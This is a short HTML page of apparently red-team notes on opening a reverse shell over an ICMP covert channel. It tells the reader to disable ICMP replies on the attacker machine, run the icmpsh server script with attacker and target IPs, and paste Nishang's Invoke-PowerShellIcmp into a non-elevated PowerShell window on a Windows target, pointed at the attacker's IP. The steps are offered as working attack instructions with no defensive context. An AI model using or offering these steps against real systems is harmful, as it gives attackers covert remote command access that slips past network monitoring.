<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>Ping / ICMP</title>
</head><body>https://msitpros.com/?p=3877<br/>
ICMP is just one possible covert channel, it could for instance be DNS if the adversary preferred that.<br/>
ICMPSH tool ported to Python by Bernardo Damele. The tool was originally made by Nico Leidecker – http://www.leidecker.info/<br/>
<br/>
First on my attacker machine I turn of ICMP replies. Don’t want to mess up the Covert Channel sending junk…<br/>
Off command: sysctl -w net.ipv4.icmp_echo_ignore_all=1<br/>
On command: sysctl -w net.ipv4.icmp_echo_ignore_all=0<br/>
<br/>
Clone the <a href="https://github.com/inquisb/icmpsh.git">ICMPSH github project</a><br/>
<br/>
Start server side using the python script within the ICMPSH project.<br/>
Python icmpsh_m.py x.x.x.x y.y.y.y<br/>
<br/>
Nishang PowerShellICMP for Windows clients (targets). The code can be found <a href="https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellIcmp.ps1">here</a>(thanks Nikhil Mittal for awesome work):<br/>
<a href="https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellIcmp.ps1">https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellIcmp.ps1</a><br/>
<br/>
Take the code and paste it into a Powershell window on the client. The Powershell does not need to be elevated and the user does not need to be a local administrator.<br/>
Invoke with:<br/>
Invoke-PowerShellIcmp -IPAddress &lt;LIP&gt;</body></html>